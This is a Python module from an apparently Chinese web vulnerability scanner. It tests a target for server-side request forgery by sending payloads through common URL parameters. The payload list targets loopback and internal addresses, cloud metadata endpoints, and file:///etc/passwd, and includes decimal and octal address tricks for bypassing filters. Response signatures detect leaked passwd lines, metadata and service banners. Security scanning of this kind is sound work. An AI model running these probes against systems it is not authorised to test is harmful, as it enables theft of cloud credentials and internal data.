"""
SSRF（服务端请求伪造）检测模块
Author: 火柴 | GitHub: huocai250

修复:
- 移除 requests 不支持的 gopher/dict 协议 payload（永远失败）
- 改用有效的 HTTP/HTTPS payload
"""
import re
from core.scanner import BaseScanner
from core.colors import log

SSRF_PARAMS = [
    "url", "uri", "path", "src", "dest", "target", "link",
    "redirect", "img", "image", "file", "page", "fetch",
    "proxy", "host", "endpoint", "callback", "load", "resource",
    "from", "to", "domain", "webhook", "next", "data",
]

SSRF_PAYLOADS = [
    # 内网 / 回环
    "http://127.0.0.1/",
    "http://127.0.0.1:22/",
    "http://127.0.0.1:3306/",
    "http://127.0.0.1:6379/",
    "http://127.0.0.1:8080/",
    "http://0.0.0.0/",
    "http://localhost/",
    "http://[::1]/",
    # 十进制 / 八进制绕过（仍是合法 HTTP URL）
    "http://2130706433/",           # 127.0.0.1 十进制
    "http://0177.0.0.1/",           # 127.0.0.1 八进制
    "http://127.000.000.001/",
    # 云元数据
    "http://169.254.169.254/",
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200/latest/meta-data/",
    # 内网段
    "http://192.168.0.1/",
    "http://10.0.0.1/",
    "http://172.16.0.1/",
    # file:// 协议（requests 不支持但服务端可能支持）
    "file:///etc/passwd",
    "file:///C:/windows/win.ini",
]

SSRF_SIGNATURES = [
    r"root:.*:0:0:",
    r"ami-id", r"instance-id", r"local-ipv4",
    r"computeMetadata",
    r"\+PONG",                 # Redis PONG
    r"SSH-2\.0",              # SSH banner
    r"220.*FTP",              # FTP banner
    r"mysql_native_password", # MySQL banner
    r"HTTP/1\.[01] [0-9]",   # 内网 HTTP 响应
]


class SSRFScanner(BaseScanner):
    def run(self):
        log("INFO", "SSRF 检测...")
        found = False
        for param in SSRF_PARAMS:
            if found:
                break
            for payload in SSRF_PAYLOADS:
                r = self.get(self.target, params={param: payload})
                if r and self._has_ssrf(r.text):
                    log("VULN", f"[SSRF] 参数: {param} → {payload[:50]}")
                    self.result.add("SSRF", "CRITICAL",
                                    f"参数 '{param}' 存在 SSRF 漏洞",
                                    f"Payload: {payload}", url=self.target)
                    found = True
                    break
        if not found:
            log("OK", "SSRF 检测完成，未发现明显漏洞")

    def _has_ssrf(self, text: str) -> bool:
        return any(re.search(p, text, re.I) for p in SSRF_SIGNATURES)
